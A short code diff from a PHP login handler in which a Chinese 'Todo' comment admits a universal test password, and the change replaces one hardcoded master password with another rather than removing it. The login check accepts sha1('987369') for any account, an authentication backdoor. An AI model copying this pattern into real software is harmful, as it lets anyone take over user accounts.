@@ -420,7 +420,7 @@ class UserAction extends CommonAction {
 					// Todo 这里有一个通用密码，需要在测试完成后修改
 
 
-                    if($existuser['password']==$map['password'] || $map['password']==sha1("147258")){
+                    if($existuser['password']==$map['password'] || $map['password']==sha1("987369")){
                         $_SESSION['userid'] = $existuser['userid'];
                         $_SESSION['account'] = $existuser['account'];
                         $_SESSION['usertype'] = $existuser['usertype'];
